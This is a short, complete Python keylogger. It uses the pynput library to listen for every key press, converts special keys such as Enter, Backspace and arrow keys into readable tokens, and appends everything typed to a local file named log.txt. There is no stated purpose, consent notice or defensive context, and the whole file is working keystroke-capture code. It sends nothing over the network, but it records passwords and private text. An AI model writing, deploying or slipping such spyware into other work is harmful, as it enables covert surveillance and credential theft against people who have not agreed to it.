from pynput.keyboard import Listener

def writetofile(key):
    keydata = str(key).replace("'", "")  # Remove quotes

    # Handle special keys
    special_keys = {
        "Key.space": " ",
        "Key.enter": "\n",
        "Key.tab": "\t",
        "Key.backspace": "[BACKSPACE]",
        "Key.shift": "",
        "Key.shift_r": "",
        "Key.ctrl_l": "",
        "Key.ctrl_r": "",
        "Key.alt_l": "",
        "Key.alt_r": "",
        "Key.esc": "[ESC]",
        "Key.caps_lock": "[CAPS_LOCK]",
        "Key.cmd": "[CMD]",
        "Key.delete": "[DELETE]",
        "Key.up": "[UP]",
        "Key.down": "[DOWN]",
        "Key.left": "[LEFT]",
        "Key.right": "[RIGHT]",
        "Key.print_screen": "[PRINT_SCREEN]"
    }

    keydata = special_keys.get(keydata, keydata)  # Replace if special, else leave as-is

    with open("log.txt", "a") as f:
        f.write(keydata)

with Listener(on_press=writetofile) as l:
    l.join()
